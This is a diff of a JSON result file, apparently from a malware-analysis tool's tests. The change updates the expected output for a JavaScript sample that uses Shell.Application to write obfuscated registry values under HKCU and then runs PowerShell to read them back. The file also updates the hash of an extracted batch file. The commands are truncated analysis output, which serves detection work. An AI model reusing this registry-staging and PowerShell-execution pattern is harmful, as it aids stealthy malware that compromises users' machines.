@@ -16,7 +16,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[14].ShellExecute(reg,add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v TheoremsUniridesce...\n\t\tShell.Application[15].ShellExecute(reg,add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Negatives /d hDdmA...\n\t\tShell.Application[16].ShellExecute(reg,add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v desightSollaria /d...\n\t\tShell.Application[17].ShellExecute(reg,add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Morass /d NWNagVtt...\n\t\tShell.Application[18].ShellExecute(reg,add HKCU\\SOFTWARE\\besmearedUnexcited /v westernmost /d AGsAaA...\n\t\tShell.Application[19].ShellExecute(reg,add HKCU\\SOFTWARE\\besmearedUnexcited /v ScalarwiseDevachan /d...\n\t\tShell.Application[20].ShellExecute(reg,add HKCU\\SOFTWARE\\besmearedUnexcited /v Foreordainment /d dWq...\n\t\tShell.Application[21].ShellExecute(reg,add HKCU\\SOFTWARE\\besmearedUnexcited /v swampberrySulphamyl /...\n\t\tShell.Application[22].ShellExecute(reg,add HKCU\\SOFTWARE\\besmearedUnexcited /v Nonliturgic /d ipoUtx...\n\t\tShell.Application[23].ShellExecute(powershell,$besmearedUnexcited = Get-ItemProperty -Path HKCU:\\SOF...",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[9].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v TheoremsUniride...\n\t\tShell.Application[10].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Negatives /d h...\n\t\tShell.Application[11].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v desightSollari...\n\t\tShell.Application[12].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\overcarelesslyEnjoins /v Morass /d NWNa...\n\t\tShell.Application[13].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v westernmost /d AG...\n\t\tShell.Application[14].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v ScalarwiseDevacha...\n\t\tShell.Application[15].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v Foreordainment /d...\n\t\tShell.Application[16].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v swampberrySulpham...\n\t\tShell.Application[17].shellexecute(\"reg\", \"add HKCU\\SOFTWARE\\besmearedUnexcited /v Nonliturgic /d ip...\n\t\tShell.Application[18].shellexecute(\"powershell\", \"$besmearedUnexcited = Get-ItemProperty -Path HKCU:...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -74,7 +74,7 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "128288a0734431ef99fe7ce06f70a56c56790543640a498bf5ec6ff87aa89415"
+        "sha256": "51aea6b9d156cfa13086060bd474895bd1a204d5633cc764eafe450cc06a2c57"
       }
     ],
     "supplementary": []
